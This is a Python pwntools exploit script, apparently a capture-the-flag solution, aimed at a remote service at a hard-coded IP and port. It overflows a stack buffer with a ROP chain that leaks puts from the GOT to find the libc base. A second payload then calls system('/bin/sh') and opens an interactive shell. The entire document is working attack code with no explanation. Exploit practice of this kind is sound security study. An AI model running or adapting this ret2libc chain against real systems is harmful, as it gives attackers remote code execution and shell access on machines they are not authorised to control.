from pwn import *
r = remote("165.232.34.85", 30007)
exe = ELF('./pb_patched')
# r = process(exe.path)
libc = ELF('./libc.so.6')
# gdb.attach(r, gdbscript='''
#            b* box+225
#            c
#            ''')
input()
r.sendlineafter(b">> ", b"2")

pop_rdi = 0x000000000040142b
payload = b"a" * 56
payload += p64(pop_rdi)
payload += p64(exe.got['puts']) + p64(exe.plt['puts'])
payload += p64(exe.sym['main'])
r.sendlineafter(b"library: ", payload)
r.recvuntil(b"thank you!\n\n")

leak_libc = u64(r.recv(6) + b"\0\0")
libc.address = leak_libc - 0x80ed0
log.info("leak libc: " + hex(leak_libc))
log.info("base libc: " + hex(libc.address))

r.sendlineafter(b">> ", b"2")
ret = 0x0000000000401016
payload = b"a" * 56
payload += p64(ret)
payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.sym['system'])
r.sendlineafter(b"library: ", payload)

r.interactive()
